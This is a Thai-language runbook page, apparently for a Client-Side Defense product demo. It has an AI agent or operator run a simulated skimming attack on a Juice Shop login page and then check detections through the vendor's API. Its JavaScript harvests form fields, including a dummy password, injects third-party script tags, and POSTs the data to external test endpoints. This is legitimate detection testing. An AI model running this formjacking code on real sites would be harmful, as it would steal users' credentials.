Phase 2 สร้างการจราจรโจมตีจำลองกับแอปพลิเคชันที่ได้รับการป้องกันและยืนยันว่า CSD ตรวจจับได้ Phase 1 จะต้องเสร็จสิ้น — ตรวจสอบ Step 7 ทั้งหมด PASS — ก่อนดำเนินการต่อ

## Step 8: Attack Simulation

<Aside type="note">
ขั้นตอนนี้ต้องการการประมวลผล JavaScript ฝั่งเบราว์เซอร์ — `curl` ไม่สามารถทริกเกอร์การตรวจจับ CSD ได้ ผู้ช่วย AI ที่มีเครื่องมือ browser automation (MCP Chrome DevTools, Playwright, Puppeteer) ดำเนินการขั้นตอนเหล่านี้โดยตรงโดยใช้ลำดับ **AI-Automated Execution** ด้านล่าง ผู้ดำเนินการที่ไม่มี browser automation ดำเนินการขั้นตอนด้วยตนเอง
</Aside>

หลังจากตรวจสอบโครงสร้างพื้นฐาน (ตรวจสอบ Phase 1 Step 7 ทั้งหมด PASS) ให้เรียกใช้สคริปต์จำลองการโจมตีเพื่อสร้างการตรวจจับ CSD สคริปต์ถูกกำหนดไว้ในคู่มือ [Trigger Detection](/csd/trigger-detection/) และ [Attack Script Library](/csd/attack-scripts/)

### AI-Automated Execution

ผู้ช่วย AI ที่มีเครื่องมือ browser automation จะเรียกใช้สคริปต์จำลองการโจมตีโดยทางโปรแกรม:

1. **Navigate with initScript** — ก่อนอื่นให้นำทางไปยัง `about:blank` เพื่อให้แน่ใจว่ามีบริบทเอกสารที่สะอาด (หลีกเลี่ยง initScripts ที่ล้าสมัยจากการนำทางก่อนหน้า) จากนั้น `navigate_page` ไปยัง `http://$F5XC_DOMAINNAME/#/login` ด้วย `initScript` ที่บันทึกเนทีฟ `setInterval`, `clearInterval`, `fetch`, และ `console.log` ก่อนที่ zone.js จะแพตช์ โพล (poll) สำหรับเขตข้อมูลแบบฟอร์มการเข้าสู่ระบบ เติมข้อมูลเข้าประจำตัวผ่านทางอักษร `HTMLInputElement.prototype.value` และ execute Combined Detection Script แบบอินไลน์ทันที ใช้ initScript ที่ระบุอย่างแม่นยำด้านล่าง
2. **Dismiss Welcome Banner** — `press_key` ด้วย `Escape` เพื่อปิด Welcome Banner ในการเยี่ยมชมครั้งต่อไป แบนเนอร์อาจไม่ปรากฏ (ถูกเก็บรักษาโดย cookies) กล่องโต้ตอบยินยอม cookie จะถูกปิดโดยอัตโนมัติโดยคีย์ Escape
3. **Wait for completion** — รอ 10 วินาทีเพื่อให้การโหลด CDN script เสร็จ/callback ข้อผิดพลาดและการแก้ไขความสัญญา fetch เสร็จสิ้น
4. **Capture evidence** — `list_console_messages` เพื่อตรวจสอบ `[CSD Demo] Simulation complete` และผลลัพธ์การโหลด CDN `list_network_requests` ที่กรองไปยังประเภท `script` และ `fetch` เพื่อตรวจสอบรหัส HTTP (`200`/`201` สำหรับความสำเร็จ `pending` สำหรับคำขอที่ถูกระงับ)

**Phase 2 initScript (ตามตัวอักษร — ใช้ตรงตามที่เขียน):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js incompatibility** — Juice Shop ใช้ zone.js ของ Angular ซึ่งแพตช์ `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` และ API เบราว์เซอร์อื่นๆ สิ่งนี้ทำให้เครื่องมือ `evaluate_script`, `fill` และ `click` ของ MCP หยุดทำงานด้วย `Cannot read properties of undefined (reading 'call')` ใช้ `navigate_page` ด้วย `initScript` แทน — `initScript` ทำงานก่อนที่ zone.js โหลด ดังนั้นคุณจึงสามารถบันทึกการอ้างอิง API ดั้งเดิมและใช้ในการเรียกกลับของ polling ได้ initScript จะต้องเติมเขตข้อมูลแบบฟอร์มโดยใช้อักษร `HTMLInputElement.prototype.value` ดั้งเดิม (ไม่ใช่ `fill`) และ run detection script แบบอินไลน์ (ไม่ผ่าน `setTimeout` ซึ่ง zone.js อาจจะสกัดกั้นหลังจากโหลดหน้า) ดู [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) สำหรับรายละเอียด
</Aside>

<Aside type="note">
**initScript accumulation** — การเรียก `navigate_page` แต่ละครั้งด้วยพารามิเตอร์ `initScript` จะเพิ่มสคริปต์ไปยังรายการถาวรที่ทำงานในการโหลดเอกสารตามมา เพื่อหลีกเลี่ยงสคริปต์เก่าที่รบกวน ให้นำทางไปยัง `about:blank` ระหว่างการรัน หรือใช้ `new_page` ด้วย `isolatedContext` เพื่อให้ได้บริบทเบราว์เซอร์ที่สะอาด
</Aside>

<Aside type="note">
**Saving native `fetch` in the initScript** — initScript บันทึก `window.fetch.bind(window)` ก่อนที่ zone.js จะแพตช์ สิ่งนี้ช่วยให้การโหลด fetch ทำงานได้อย่างถูกต้องโดยไม่มี zone.js `Cannot read properties of undefined` errors initScript เดียวกัน (พร้อมการบันทึก native `fetch`) ใช้สำหรับการรัน Phase 2 และ Phase 3 attack — CSD mitigation ไม่ได้สกัดกั้นการโหลด `fetch()` ดังนั้นการบันทึกการอ้างอิงดั้งเดิมจึงไม่ส่งผลต่อพฤติกรรมการลดบัญชี
</Aside>

<Aside type="caution">
**Transient origin 404** — ในการนำทางครั้งแรกไปยังแอปพลิเคชัน Angular `polyfills.js` หรือสคริปต์แอปอื่นๆ อาจส่งคืน HTTP 404 ชั่วคราวจากเซิร์ฟเวอร์ต้นทาง สิ่งนี้ทำให้ Angular ล้มเหลวในการเริ่มต้น ส่งผลให้หน้าว่างเปล่าไม่มีแบบฟอร์มการเข้าสู่ระบบ 404 เป็นแบบชั่วคราว — คำขอที่ตามมาส่งคืน 200 หรือ 304 **Recovery:** นำทางไปยัง `about:blank` รอ 2 วินาที จากนั้นลองนำทางใหม่ หากปัญหาคงอยู่ในการลองหลายครั้ง ให้ตรวจสอบสุขภาพต้นทางผ่านเส้นทางตัวสร้างสมดุลโหลด (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`)
</Aside>

### Manual Execution

ผู้ดำเนินการที่ไม่มีเครื่องมือ browser automation ดำเนินการขั้นตอนด้วยตนเอง:

1. **Navigate** ไปยังหน้าการเข้าสู่ระบบแอปพลิเคชันที่ได้รับการป้องกัน: `http://xF5XC_DOMAINNAMEx/#/login`
2. **Enter dummy credentials** — พิมพ์ `test@example.com` ในเขตข้อมูล Email และ `P@ssword123` ในเขตข้อมูล Password (อย่าส่งแบบฟอร์ม)
3. **Open DevTools** — กด **F12** และสลับไปยังแท็บ **Console**
4. **Run the Combined Detection Script** — วางสคริปต์จาก [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) ลงในคอนโซล และกด Enter
5. **Verify console output** — ยืนยันว่าผลลัพธ์ `[CSD Demo]` ที่มีหลายเฟสแสดง: การเก็บเขตข้อมูลแบบฟอร์ม การฉีด script จากโดเมน CDN 4 โดเมน และการส่งข้อมูลไปยัง endpoint 2 ที่

### What Gets Triggered

| Signal | Behavior | Detection |
| --- | --- | --- |
| Form field harvesting | Reads email and password input values | Scripts reading sensitive form fields — flagged High Risk |
| Script injection | Injects 4 `&lt;script&gt;` tags from `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Up to 4 new third-party script domains detected (CDN availability varies) |
| Data exfiltration | Sends harvested data via `fetch` to `www.httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains |

<Aside type="note">
**CDN availability varies.** ไม่ใช่ทั้งหมด 4 CDN scripts จะโหลดในแต่ละครั้ง — ข้อจำกัดของทรัพยากรเบราว์เซอร์ สภาวะเครือข่าย หรือการ throttle CDN อาจทำให้บางส่วนล้มเหลวด้วย `ERR_INSUFFICIENT_RESOURCES` หรือ timeout การจำลองสำเร็จหากมี **any** CDN script โหลด CSD ตรวจจับความพยายามฉีดโดยไม่คำนึงถึงว่า script โหลดสำเร็จหรือไม่ — การสร้าง `&lt;script&gt;` tag เองเป็นสัญญาณการตรวจจับ

ในกรณีที่รุนแรง `ERR_INSUFFICIENT_RESOURCES` อาจเพิ่มเป็นความล้มเหลวระดับหน้า — หน้าทั้งหมดกลายเป็นว่าง ภาพหน้าจอหมดเวลา และ `take_snapshot` ล้มเหลว โดยทั่วไปเกิดขึ้นหลังจากนำทางหลายครั้งโดยใช้ initScripts หนักสะสมในบริบทเบราว์เซอร์เดียวกัน **Recovery:** ใช้ `new_page` ด้วย `isolatedContext` เพื่อสร้างบริบทเบราว์เซอร์ใหม่ จากนั้นลองใหม่จากลำดับ `about:blank` → `navigate_page` ด้วย initScript สิ่งนี้แตกต่างจากความล้มเหลวของ CDN script แต่ละรายการ ซึ่งไม่ส่งผลต่อความสำเร็จของการจำลอง
</Aside>

<Aside type="tip">
หลังจากเรียกใช้การจำลองการโจมตี ให้ใช้ลูปโพลแบบกำหนด (deterministic) นี้เพื่อรอการตรวจจับ:

1. Query `/detected_domains` ทุก 60 วินาที
2. หาก DET-3 ผ่าน (exfil domains ปรากฏใน `/detected_domains`) ให้ดำเนินการไปยัง Step 9 ทันที
3. หากยังคงว่างเปล่าหลังจาก 10 queries (10 นาที) ให้ตรวจสอบสถานะ CSD (Phase 1 Step 5) และการลงทะเบียนโดเมนที่ได้รับการป้องกัน (Phase 1 Step 6) — หนึ่งในนี้อาจมีการกำหนดค่าที่ไม่ถูกต้อง
4. หากยังคงว่างเปล่าหลังจาก 30 queries (30 นาที) ให้หยุดและรายงานให้ผู้ดำเนินการ — อย่าดำเนินการต่อไปยัง Phase 3

สำหรับการจำลองที่เป้าหมายเพิ่มเติม (หมวดหมู่การโจมตีแต่ละหมวด stress test การตรวจจับสูงสุด) ดู [Attack Script Library](/csd/attack-scripts/)
</Aside>

### Evidence

ผู้ช่วย AI ควรรายงานสิ่งต่อไปนี้ สำหรับการดำเนินการแบบ AI-automated การตรวจสอบความถูกต้องจะถูกจับภาพโดยทางโปรแกรมผ่าน `list_console_messages` (ฟังก์ชัน polling ของ initScript บันทึกผลลัพธ์ไปยังคอนโซล) สำหรับการดำเนินการด้วยตนเอง ผู้ดำเนินการอ่านผลลัพธ์คอนโซลของเบราว์เซอร์

| Check | Expected | Status |
| --- | --- | --- |
| Login page loaded | `200 OK` at `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| Console script executed | `[CSD Demo] Simulation complete` in console output | PASS / FAIL |
| Fields harvested | Count > 0 in console output | PASS |
| Scripts injected | 1–4 CDN domains in console output (some may fail with resource errors) | PASS if any CDN domain appears |
| Exfil channels | 2 fetch POST attempts in console output | PASS |

<Aside type="tip">
หากใบรับรอง HTTPS LB ถูกต้อง (`CertificateValid`) คุณอาจเรียกใช้การจำลองกับ `https://$F5XC_DOMAINNAME/#/login` ได้เป็นทางเลือก สิ่งนี้ไม่จำเป็นสำหรับการก้าวหน้าของเดโม
</Aside>

## Step 9: Detection Verification via API

Query endpoint API ของ CSD เพื่อยืนยันว่ามีการตรวจจับปรากฏ ใช้ลูปโพล: query `/detected_domains` ทุก 60 วินาที ดำเนินการทันทีที่ DET-3 ผ่าน หากไม่ผ่าน DET-3 หลังจาก 10 นาที ให้ตรวจสอบการกำหนดค่า CSD หากไม่ผ่าน DET-3 หลังจาก 30 นาที ให้หยุดและรายงานให้ผู้ดำเนินการ endpoint เหล่านี้ได้รับการ document ใน [API Reference](/csd/api-reference/) และใช้การรับรองและเนมสเปซเดียวกันกับขั้นตอนก่อนหน้า

<Aside type="note">
**Endpoint processing order:** `/detected_domains` จะถูกสร้างเป็นครั้งแรกและเป็นตัวบ่งชี้หลักว่า CSD pipeline ทำงานได้ `/scripts` และ `/formFields` จะถูกสร้างในตารางเวลาประมวลผลแบ็กเอนด์ที่ช้ากว่า และอาจยังคงว่างเปล่าเป็นเวลา 20–30 นาทีแม้จะมีการรัน simulation หลายครั้ง หาก `/detected_domains` แสดง exfil domains (`www.httpbin.org`, `jsonplaceholder.typicode.com`) ให้ถือว่าการจำลองถูกตรวจจับเรียบร้อยแล้วและดำเนินการ — การตรวจสอบ DET-1 ด้านล่างสะท้อนสิ่งนี้
</Aside>

### Detected Scripts

Query สำหรับสคริปต์ที่ตรวจจับในช่วง 24 ชั่วโมงที่ผ่านมา:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| Field | Expected | Status |
| --- | --- | --- |
| `total` | > 0 (scripts detected) | PASS if > 0; PENDING if 0 but `/detected_domains` shows exfil domains |
| Script names | Includes CDN domains (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) in `script_name` | PASS if injected CDN domains appear |

### Detected Domains

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

### Form Fields

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| Field | Expected | Status |
| --- | --- | --- |
| `total` | > 0 | PASS if > 0; PENDING if 0 but DET-3 passes |
| `name` | Includes `email`, `password` | PASS if sensitive fields appear |
| `sensitivity` | `Sensitive` for email/password fields | PASS if ML classified correctly |

<Aside type="note">
**Form field processing is slower than domain detection.** endpoint `/formFields` อาจส่งกลับเขตข้อมูลที่มีข้อมูลเมตาไม่สมบูรณ์ในการสอบถาม
ครั้งแรก การจำแนกความไว ML (`Sensitive` vs
`Not Sensitive`) จะถูกสร้างหลังจากการประมวลผลแบ็กเอนด์เสร็จสิ้น —
สิ่งนี้อาจใช้เวลา 20–30 นาทีหลังจากการรัน simulation ครั้งแรก หาก
เขตข้อมูลปรากฏแต่ขาดการจำแนก ให้สอบถามอีกครั้งภายหลัง DET-3
(`/detected_domains`) เป็นเกณฑ์ผ่านหลัก
</Aside>
